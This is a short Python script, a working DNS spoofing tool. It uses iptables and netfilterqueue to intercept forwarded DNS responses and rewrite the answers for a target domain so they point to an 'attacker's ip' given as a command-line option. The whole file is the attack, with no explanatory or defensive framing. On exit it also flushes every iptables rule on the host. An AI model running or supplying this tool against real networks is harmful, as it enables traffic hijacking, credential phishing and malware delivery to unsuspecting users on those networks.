#!/usr/bin/env python3

import optparse
import netfilterqueue
import subprocess
import scapy.all as scapy


def get_parameters():
    parser = optparse.OptionParser()
    parser.add_option('-d', '--domain', dest='domain', help='domain to spoof')
    parser.add_option('--ip', dest='ip', help='attacker\'s ip')
    (options, arguments) = parser.parse_args()
    if not options.domain:
        parser.error('[-] domain is required. use --help for more information')
    elif not options.ip:
        parser.error(
            '[-] attacker\'s ip is required. use --help for more information')
    return options


def modify_packet(packet, answer):
    packet[scapy.DNS].an = answer
    packet[scapy.DNS].ancount = 1
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.UDP].len
    del packet[scapy.UDP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        global options
        if options.domain in str(qname):
            print("[+] spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=options.ip)
            scapy_packet = modify_packet(scapy_packet, answer)
            packet.set_payload(bytes(scapy_packet))
    packet.accept()


options = get_parameters()
try:
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)
